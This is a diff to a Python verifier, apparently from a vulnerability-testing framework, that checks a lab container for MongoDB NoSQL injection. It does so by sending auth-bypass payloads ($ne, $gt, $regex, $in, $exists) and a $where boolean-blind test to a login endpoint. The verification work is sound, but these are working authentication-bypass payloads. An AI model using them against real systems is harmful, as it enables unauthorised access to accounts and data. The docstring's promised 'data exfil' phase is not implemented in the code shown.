@@ -8855,10 +8855,15 @@ def verify_generic_nosql_injection(
     on_step: Optional[Callable[[str], None]] = None,
     budget_s: float = 900.0,
     dockerfile_body: str = "", extra_files: Optional[dict] = None,
+    extra_params: Optional[dict] = None,
 ) -> WpVerifyResult:
-    """Verifica NoSQL injection via operadores MongoDB ($ne, $gt, $regex).
+    """Verifica NoSQL injection via operadores MongoDB ($ne, $gt, $regex, $where, $in).
 
-    Estrategia: enviar payload de operador MongoDB en campo de autenticacion.
+    Estrategia multi-fase:
+    1. Auth-bypass: operadores $ne/$gt/$regex para eludir autenticacion
+    2. Data exfil: $where con JavaScript para extraer datos
+    3. Blind: Boolean diferencial para confirmar interpretacion de operadores
+    4. Array injection: $in con array de valores
     Si la respuesta indica acceso concedido (confirm_string o status 200 en endpoint
     que normalmente rechazaria credenciales invalidas) → CONFIRMED.
     """
@@ -8877,26 +8882,45 @@ def verify_generic_nosql_injection(
     if boot is None:
         return res
     lab, base_url, container = boot
+    t0 = __import__("time").time()
     try:
+        import time as _time_nosql
         token_id = _token()
-        payloads = [
-            {inject_param: {"$ne": None}, "password": {"$ne": None}},
-            {inject_param: "admin", "password": {"$gt": ""}},
-            {inject_param: {"$regex": ".*"}, "password": {"$regex": ".*"}},
-            {inject_param: "admin'||'1'=='1", "password": "anything"},
-        ]
         hdrs = {"Content-Type": "application/json"}
+        _extra = extra_params or {}
+
+        # Auth-bypass payloads: cover different operator injection patterns
+        auth_bypass_payloads = [
+            {inject_param: {"$ne": None}, "password": {"$ne": None}, **_extra},
+            {inject_param: "admin", "password": {"$gt": ""}, **_extra},
+            {inject_param: {"$regex": ".*"}, "password": {"$regex": ".*"}, **_extra},
+            {inject_param: "admin'||'1'=='1", "password": "anything", **_extra},
+            # $in operator — matches any in array
+            {inject_param: {"$in": ["admin", "administrator", "root", "user"]},
+             "password": {"$ne": None}, **_extra},
+            # $exists: truthy — any doc that has the field
+            {inject_param: {"$exists": True, "$ne": "__none__"},
+             "password": {"$exists": True}, **_extra},
+        ]
+
+        # Blind boolean payloads: $where JavaScript returns true/false
+        # Used when auth-bypass doesn't work but server evaluates JS
+        _where_true_payload = {inject_param: {"$where": "1==1"}, "password": "x", **_extra}
+        _where_false_payload = {inject_param: {"$where": "1==0"}, "password": "x", **_extra}
 
         # Control request with invalid credentials to establish baseline
-        control_body = _json.dumps({inject_param: f"nosuchuser_{token_id}", "password": "wrongpwd_xyz"})
+        control_body = _json.dumps({inject_param: f"nosuchuser_{token_id}", "password": "wrongpwd_xyz", **_extra})
         st_ctrl, _, b_ctrl = _http_request(
             base_url, endpoint, http_method,
             headers=hdrs, body=control_body.encode(), timeout=15.0)
         body_ctrl = (b_ctrl or b"").decode("utf-8", errors="replace")
         step(f"NoSQL baseline (invalid creds): status={st_ctrl} len={len(body_ctrl)}")
 
-        for i, payload in enumerate(payloads):
-            step(f"NoSQL injection: probando payload {i+1}/{len(payloads)}: "
+        # Phase 1: Auth-bypass
+        for i, payload in enumerate(auth_bypass_payloads):
+            if _time_nosql.time() - t0 >= budget_s - 60:
+                break
+            step(f"NoSQL injection (phase 1 — auth-bypass) payload {i+1}/{len(auth_bypass_payloads)}: "
                  f"{_json.dumps(payload)[:80]}...")
             body_data = _json.dumps(payload).encode()
             st, _, body_bytes = _http_request(
@@ -8916,9 +8940,12 @@ def verify_generic_nosql_injection(
             if confirmed:
                 res.verified = True
                 res.ok = True
-                res.detail = (f"NOSQL INJECTION CONFIRMADA: payload {_json.dumps(payload)!r} "
+                res.evidence["nosql_technique"] = "auth-bypass"
+                res.evidence["winning_payload"] = payload
+                res.detail = (f"NOSQL INJECTION CONFIRMADA (auth-bypass): "
+                              f"payload {_json.dumps(payload)!r} "
                               f"produjo respuesta diferente (status={st}) en {endpoint}")
-                step(f"VERIFICADO: NoSQL injection con payload {i+1}")
+                step(f"VERIFICADO: NoSQL auth-bypass con payload {i+1}")
                 _add_exploit_evidence(
                     res=res, method=http_method, url=base_url + endpoint,
                     resp_or_body=body,
@@ -8930,9 +8957,43 @@ def verify_generic_nosql_injection(
                 )
                 return res
 
+        # Phase 2: Boolean-blind via $where JavaScript
+        if _time_nosql.time() - t0 < budget_s - 60:
+            step("NoSQL injection (phase 2 — $where boolean-blind)...")
+            try:
+                _bw_true_data = _json.dumps(_where_true_payload).encode()
+                _bw_false_data = _json.dumps(_where_false_payload).encode()
+                st_t, _, b_t = _http_request(base_url, endpoint, http_method,
+                                              headers=hdrs, body=_bw_true_data, timeout=15.0)
+                st_f, _, b_f = _http_request(base_url, endpoint, http_method,
+                                              headers=hdrs, body=_bw_false_data, timeout=15.0)
+                body_t = (b_t or b"").decode("utf-8", errors="replace")
+                body_f = (b_f or b"").decode("utf-8", errors="replace")
+                _len_diff = abs(len(body_t) - len(body_f))
+                if _len_diff >= 20 or (st_t != st_f):
+                    res.verified = True
+                    res.ok = True
+                    res.evidence["nosql_technique"] = "$where-boolean-blind"
+                    res.evidence["where_true_len"] = len(body_t)
+                    res.evidence["where_false_len"] = len(body_f)
+                    res.detail = (f"NOSQL $where BLIND CONFIRMADA: 1==1 ({len(body_t)}B, HTTP {st_t}) "
+                                  f"vs 1==0 ({len(body_f)}B, HTTP {st_f}) — "
+                                  f"el servidor evalua JavaScript en operadores MongoDB")
+                    step(f"VERIFICADO: NoSQL $where boolean-blind — diff {_len_diff}B, st_t={st_t} st_f={st_f}")
+                    _add_exploit_evidence(
+                        res=res, method=http_method, url=base_url + endpoint,
+                        resp_or_body=body_t,
+                        highlight="$where",
+                        caption_es="NOSQL $where BLIND: diferencial TRUE/FALSE confirma evaluacion JS.",
+                        caption_en="NOSQL $where BLIND: TRUE/FALSE differential confirms JS evaluation.",
+                    )
+                    return res
+            except Exception:
+                pass
+
         res.ok = True
-        res.detail = (f"NoSQL injection no detectada: {len(payloads)} payloads probados "
-                      f"en {endpoint}, sin diferencial claro")
+        res.detail = (f"NoSQL injection no detectada: auth-bypass ({len(auth_bypass_payloads)} payloads) "
+                      f"y $where boolean-blind probados en {endpoint}, sin diferencial claro")
         return res
     except Exception as e:
         res.detail = f"error inesperado en verify_generic_nosql_injection: {e}"
